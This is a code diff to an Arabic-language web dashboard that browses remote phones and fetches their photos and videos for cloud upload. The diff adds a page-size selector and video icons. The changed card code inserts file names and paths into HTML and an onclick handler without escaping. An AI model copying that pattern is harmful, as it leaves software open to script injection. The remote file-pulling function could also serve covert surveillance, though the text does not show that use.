@@ -59,15 +59,28 @@
 
         <!-- 🖼️ قسم معرض صور الهاتف المختار -->
         <div class="bg-slate-800 p-6 rounded-xl border border-slate-700 shadow-lg mb-8">
-            <div class="flex justify-between items-center mb-4">
-                <h2 class="text-lg font-semibold text-purple-400">🖼️ معرض صور الهاتف المختار</h2>
-                <button onclick="requestFetchImages(1)" class="bg-purple-600 hover:bg-purple-500 text-white px-3 py-1.5 rounded text-xs transition font-bold shadow">
-                    🔄 جلب صور الهاتف
-                </button>
+            <div class="flex flex-col md:flex-row justify-between items-start md:items-center mb-4 gap-4">
+                <h2 class="text-lg font-semibold text-purple-400">🖼️ معرض وسائط الهاتف المختار</h2>
+                
+                <div class="flex items-center gap-3">
+                    <!-- 🔴 تحديد عدد الوسائط في الصفحة (القائمة المنسدلة التي كانت مفقودة) -->
+                    <div class="flex items-center gap-2">
+                        <label class="text-xs text-slate-400">العدد/صفحة:</label>
+                        <select id="pageSizeSelector" class="bg-slate-900 border border-slate-700 text-slate-200 text-xs rounded px-2 py-1.5 focus:outline-none focus:border-purple-500">
+                            <option value="5">5 ملفات</option>
+                            <option value="10" selected>10 ملفات</option>
+                            <option value="20">20 ملف</option>
+                            <option value="50">50 ملف</option>
+                        </select>
+                    </div>
+                    <button onclick="requestFetchImages(1)" class="bg-purple-600 hover:bg-purple-500 text-white px-3 py-1.5 rounded text-xs transition font-bold shadow">
+                        🔄 جلب الوسائط
+                    </button>
+                </div>
             </div>
 
             <div id="galleryGrid" class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-4 mb-4">
-                <div class="col-span-full text-center py-6 text-slate-500 text-sm">اختر جهازاً واضغط جلب الصور...</div>
+                <div class="col-span-full text-center py-6 text-slate-500 text-sm">اختر جهازاً واضغط جلب الوسائط...</div>
             </div>
 
             <div class="flex justify-between items-center border-t border-slate-700 pt-3">
@@ -131,7 +144,6 @@
         let rawFilesData = []; 
         let currentFilter = 'all'; 
         let currentImagePage = 1;
-        const imagePageSize = 10;
 
         // 🟢 جلب وعرض الأجهزة في القائمة المنسدلة
         async function loadDevicesAndStatus() {
@@ -190,7 +202,7 @@
             activeDeviceId = document.getElementById('deviceSelector').value;
             loadDevicesAndStatus(); // تحديث الألوان
             fetchDirectory(""); // تصفير وتحديث الملفات للجهاز الجديد
-            document.getElementById('galleryGrid').innerHTML = '<div class="col-span-full text-center py-6 text-slate-500 text-sm">تم تغيير الجهاز، اضغط جلب الصور للعرض.</div>';
+            document.getElementById('galleryGrid').innerHTML = '<div class="col-span-full text-center py-6 text-slate-500 text-sm">تم تغيير الجهاز، اضغط جلب الوسائط للعرض.</div>';
         }
 
         setInterval(loadDevicesAndStatus, 15000);
@@ -293,7 +305,7 @@
             });
         }
 
-// 🖼️ جلب الوسائط مع قراءة العدد من القائمة والانتظار دقيقة كاملة
+        // 🖼️ جلب الوسائط مع قراءة العدد من القائمة والانتظار دقيقة كاملة
         async function requestFetchImages(page) {
             if (!activeDeviceId) return;
             currentImagePage = page;
@@ -322,15 +334,20 @@
             grid.innerHTML = '';
 
             if (error || !data || data.length === 0) {
-                grid.innerHTML = `<div class="col-span-full text-center py-6 text-slate-500 text-sm">لا توجد صور في الذاكرة المؤقتة.</div>`;
+                grid.innerHTML = `<div class="col-span-full text-center py-6 text-slate-500 text-sm">لا توجد وسائط في الذاكرة المؤقتة.</div>`;
                 return;
             }
 
             data.forEach(item => {
                 const card = document.createElement('div');
                 card.className = "bg-slate-900 p-2 rounded-lg border border-slate-700 text-center flex flex-col justify-between shadow";
+                
+                // تحديد نوع الملف (صورة أم فيديو) للعرض
+                const isVideo = item.file_name.toLowerCase().endsWith('.mp4') || item.file_name.toLowerCase().endsWith('.mkv');
+                const icon = isVideo ? '🎬' : '📷';
+
                 card.innerHTML = `
-                    <div class="w-full h-24 bg-slate-800 flex items-center justify-center rounded mb-2 text-xs text-slate-400 border border-slate-700">📷 معاينة</div>
+                    <div class="w-full h-24 bg-slate-800 flex items-center justify-center rounded mb-2 text-xs text-slate-400 border border-slate-700">${icon} معاينة</div>
                     <p class="text-xs text-slate-200 truncate mb-2" title="${item.file_name}">${item.file_name}</p>
                     <button onclick="quickUpload('${item.file_path}')" class="bg-emerald-600 hover:bg-emerald-500 text-white py-1 px-2 rounded text-xs transition">رفع للسحابة ⬆️</button>
                 `;
